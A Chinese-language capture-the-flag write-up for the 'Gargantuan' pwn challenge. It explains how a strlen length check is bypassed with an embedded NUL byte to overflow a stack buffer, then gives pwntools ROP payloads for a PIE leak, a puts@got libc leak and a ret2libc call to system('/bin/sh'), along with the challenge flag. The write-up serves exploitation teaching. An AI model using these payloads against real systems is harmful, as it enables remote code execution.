# Gargantuan

## 题目简述

函数有 0x500 字节累积缓冲区 `storage` 与 0x200 字节临时缓冲区 `tmp`，循环读取五次。代码用 `strlen(tmp) <= 0x100` 检查长度，却按 `read` 的实际返回值复制；在第 256 字节前放 NUL，便能让检查通过而复制更多数据，最终溢出 `storage`。

## 解题过程

前四次各发送约 `0xfd` 个 `A` 加换行，把 `storage` 填到栈帧末端附近。第五次构造：

```python
b"A" * 0xff + b"\x00" + overflow
```

`strlen` 在偏移 255 的 NUL 停止，仍不超过 `0x100`；`memcpy` 却复制整个 `read` 长度。函数末尾本来就会用 `%p` 打印 `gargantuan` 地址，第一次据此计算 PIE 基址；同时只覆盖保存返回地址的低字节，让控制流重新进入可再次调用 `gargantuan` 的代码路径。

第二轮重用漏洞，以二进制中的 `pop rdi; ret` 调用 `puts(puts@got)`，再返回 `gargantuan`：

```python
payload  = padding
payload += p64(base + pop_rdi)
payload += p64(base + elf.got["puts"])
payload += p64(base + elf.plt["puts"])
payload += p64(base + elf.sym["gargantuan"])
```

由泄露的 `puts` 地址减去附件 libc 中的符号偏移得到 libc 基址。第三轮执行 ret2libc：

```python
payload  = padding
payload += p64(libc_base + ret)
payload += p64(base + pop_rdi)
payload += p64(libc_base + next(libc.search(b"/bin/sh")))
payload += p64(libc_base + libc.sym["system"])
```

最终 flag 为 `byuctf{I_wanted_to_make_buffer_sizes_bigger_but_the_network_didnt_agree}`。

## 方法总结

漏洞来自 C 字符串长度与二进制读取长度的语义错配。利用链分三次完成：部分覆盖重入并确定 PIE、ret2plt 泄露 libc、ret2libc 获取 shell。每次都返回漏洞函数，才能在同一连接内逐步补齐地址信息。
